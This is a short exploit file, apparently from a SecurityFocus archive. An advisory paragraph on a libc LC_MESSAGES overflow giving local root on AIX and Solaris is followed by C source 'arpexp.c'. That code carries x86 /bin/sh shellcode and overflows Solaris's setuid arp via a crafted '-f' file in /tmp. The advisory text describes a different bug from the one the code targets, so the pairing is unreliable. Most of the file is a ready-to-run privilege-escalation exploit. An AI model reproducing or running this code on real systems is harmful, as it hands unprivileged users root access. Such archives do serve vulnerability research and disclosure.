// source: https://www.securityfocus.com/bid/268/info

A buffer overflow in libc's handling of the LC_MESSAGES environment variable allows a malicious user to exploit any suid root program linked agains libc to obtain root privileges. This problem is found in both IBM's AIX and Sun Microsystem's Solaris. This vulnerability allows local users to gain root privileges.

#include <fcntl.h>

/* arpexp.c

   arp overflow proof of concept by ahmed@securityfocus.com
   shellcode originally written by Cheez Whiz.

   tested on x86 solaris 7,8beta

   default should work.  if not, arg1 = offset. +- by 100's

   Except for shellcode, copyright Security-Focus.com, 11/2000
*/

long get_esp() { __asm__("movl %esp,%eax"); }

int main(int ac, char **av)
{

  char shell[] = "\xeb\x45\x9a\xff\xff\xff\xff\x07\xff"
                 "\xc3\x5e\x31\xc0\x89\x46\xb7\x88\x46"
                 "\xbc\x88\x46\x07\x89\x46\x0c\x31\xc0"
                 "\xb0\x2f\xe8\xe0\xff\xff\xff\x52\x52"
                 "\x31\xc0\xb0\xcb\xe8\xd5\xff\xff\xff"
                 "\x83\xc4\x08\x31\xc0\x50\x8d\x5e\x08"
                 "\x53\x8d\x1e\x89\x5e\x08\x53\xb0\x3b"
                 "\xe8\xbe\xff\xff\xff\x83\xc4\x0c\xe8"
                 "\xbe\xff\xff\xff\x2f\x62\x69\x6e\x2f"
                 "\x73\x68\xff\xff\xff\xff\xff\xff\xff"
                 "\xff\xff";

  unsigned long magic = 0x8047b78;
  unsigned long r = get_esp() + 600;
  unsigned char buf[300];
  int f;

  if (ac == 2)
    r += atoi(av[1]);

  memset(buf,0x61,sizeof(buf));
  memcpy(buf+52,&magic,4);
  memcpy(buf+76,&r,4);

  f = open("/tmp/ypx",O_CREAT|O_WRONLY,0600);
  write(f,"1 2 3 4 ",8);
  write(f,buf,sizeof(buf));
  close(f);

  memset(buf,0x90,sizeof(buf));
  memcpy(buf,"LOL=",4);
  memcpy(buf+(sizeof(buf)-strlen(shell)),shell,strlen(shell));
  putenv(buf);

  system("/usr/sbin/arp -f /tmp/ypx");
  unlink("/tmp/ypx");

}